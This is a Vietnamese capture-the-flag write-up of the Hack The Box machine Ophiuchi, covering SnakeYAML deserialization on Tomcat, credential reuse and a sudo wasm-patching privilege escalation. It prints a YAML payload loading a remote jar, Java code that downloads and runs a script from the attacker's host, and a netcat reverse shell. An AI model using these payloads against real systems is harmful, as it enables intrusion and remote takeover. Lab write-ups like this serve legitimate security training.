![image](https://hackmd.io/_uploads/S1ZbQGsiR.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/315/information)

## Comment
Máy này hơi rối vụ đọc file asm

# Recon
## nmap 
Sau khi nmap ta thấy nó scan được **2** port ssh và http 
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.227       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 11:53 EDT
Nmap scan report for 10.10.10.227
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.01 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,8080 -sCV 10.10.10.227       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 11:54 EDT
Nmap scan report for 10.10.10.227
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
```
## Port 8080 - http
Ta được điều hướng đến một trang YAML parser

![image](https://hackmd.io/_uploads/SJTsjwJh0.png)

Khi ta điền nội dung vào nó trả về kết quả là đang bảo trì

![image](https://hackmd.io/_uploads/ryrxnPyhR.png)

### YAML 
Sau khi google ta biết được **YAML parser** là một công cụ hoặc thư viện được sử dụng để phân tích cú pháp (parse) các tệp YAML

Ví dụ, một đoạn mã YAML:
```
name: John Doe
age: 30
address:
  street: 123 Main St
  city: Anytown
```
Khi được parse, đoạn mã này có thể được chuyển đổi thành một cấu trúc dữ liệu có thể sử dụng trong ngôn ngữ lập trình, ví dụ như:
```
{
  "name": "John Doe",
  "age": 30,
  "address": {
    "street": "123 Main St",
    "city": "Anytown"
  }
}
```
Từ phân tích định nghĩa trên rất có thể nó sẽ bị khai thác lỗ hổng nào đó. Tiếp tục thử với `'` thì server nó trả về lỗi này. Tức là nó đã xử lý một thứ gì đó

![image](https://hackmd.io/_uploads/Bk7JAPyh0.png)

Sau khi google ta thấy được một [bài viết](https://rioasmara.com/2021/07/13/snake-yaml-for-reverse-shell/) nói về lỗi y hệt như này 

![image](https://hackmd.io/_uploads/Hyy5Jd13C.png)

### SnakeYaml deserilization
Lỗ hổng nằm ở cách Snakeyaml phân tích tệp yaml. Có thể thấy trong đoạn code bên dưới:
```
Yaml yaml = new Yaml();
Object obj = yaml.load(<--user input data-->);
```
Hàm yaml.load đang được sử dụng với dữ liệu đầu vào của người dùng được chuyển trực tiếp tới hàm đó thì ứng dụng có thể dễ bị tổn thương khi deserilization, điều này có thể dẫn đến RCE

https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858

# User flag 
## Exploit 
Ta sẽ nhận được payload khai thác như sau:

![image](https://hackmd.io/_uploads/B1onJ_kn0.png)

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.93:8888/yaml-payload.jar"]
  ]]
]
```
### YAML payload

![image](https://hackmd.io/_uploads/rks2gOJhC.png)

Ta sẽ viết lại AwesomeScriptEngineFactory.java để kích hoạt reverse shell
```
public AwesomeScriptEngineFactory() {
        try {
        // Tải reverse shell về máy mục tiêu
            Runtime.getRuntime().exec("curl http://10.10.14.93:8888/revshell.sh -o /tmp/revshell.sh");
        // Lưu thi file    
            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
Sau khi chỉnh lại payload ta sẽ compile `AwesomeScriptEngineFactory.java ` thành jar file
```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
`revshell.sh` sẽ là lệnh tạo reverse shell 
```
#!/bin/bash/sh
mkfifo /tmp/lol;nc 10.10.14.93 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

![image](https://hackmd.io/_uploads/Byd-u_12R.png)

Tuy nhiên phải switch sang user admin mới có thể lấy được flag

## Post-Exploit 
### Lateral Movement 
Để có thể switch sang ta sẽ tìm file conf vì khả năng credentail ở đó
```
$ find / -name tomcat 2>/dev/null
```
![image](https://hackmd.io/_uploads/HyJlK_y3R.png)

Thấy 2 file `tomcat-users.xml` và `tomcat-users.xsd` có thể chứa credential

![image](https://hackmd.io/_uploads/S1e7K_y3A.png)

Đọc `tomcat-users.xml` ta có

![image](https://hackmd.io/_uploads/HJrHYd1hC.png)

Từ đây switch user với `admin:whythereisalimit`. Vì xuất hiện lỗi `Authentication failure` nên ta sẽ sử dụng **tty**

```
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://hackmd.io/_uploads/Hyuitukh0.png)

```
admin@ophiuchi:/opt/tomcat/conf$ cat /home/admin/user.txt
cat /home/admin/user.txt
263f2617ebe6ff6af9******
```

# Root user
## Exploit
### sudo -l 
![image](https://hackmd.io/_uploads/rJZDVFJnA.png)

Ta có thể chạy /usr/bin/go run /opt/wasm-functions/index.go với quyền root.  Tìm tệp này để xem nó có gì

![image](https://hackmd.io/_uploads/rJKpVY120.png)

`index.go` đang đọc file `main.wasm` và kiểm tra giá trị của biến f. Nếu khác 1 thì nó sẽ in `Not ready to deploy`. Nếu bằng 1 nó sẽ chạy file `deploy.sh`. Từ đây có thể đoán `deploy.sh` là nơi ta có thể sẽ thao túng để gọi ra root shell

![image](https://hackmd.io/_uploads/SkoqHFJ30.png)

Từ trên ta sẽ thực hiện nó qua `/tmp`

![image](https://hackmd.io/_uploads/S1dV8YJ2C.png)

### main.wasm
Mục đích chính của file wasm là cung cấp các ứng dụng nhanh và hiệu suất cao trên các trang web nhưng nó cũng có thể chạy trong các môi trường khác nhau. Bởi vì nó là file dạng binary nên phải có tool đọc nó. Tải file về và phân tích
```
scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
```
Cài tool https://github.com/webassembly/wabt 

![image](https://hackmd.io/_uploads/rkkRaK12C.png)
 
Để nhìn được rõ hơn ta dùng `wasm-decompile`. Nó gọi đến hàm info() để trả về 0

![image](https://hackmd.io/_uploads/HJWvy9ynA.png)

Ta sẽ tiến hành sửa cho nó trả về 1
```
┌──(kali㉿kali)-[~/Downloads]
└─$ wasm2wat main.wasm > main.wat
```

![image](https://hackmd.io/_uploads/B1aCkc13C.png)

Bây giờ upload lại file về máy mục tiêu và chạy lại lệnh
```
admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy

```

![image](https://hackmd.io/_uploads/HyWDZcJ2C.png)

## Post-Exploit
```
# cat /root/root.txt        
d31cc6fc38f56b5*********
```
![image](https://hackmd.io/_uploads/rkda491hA.png)
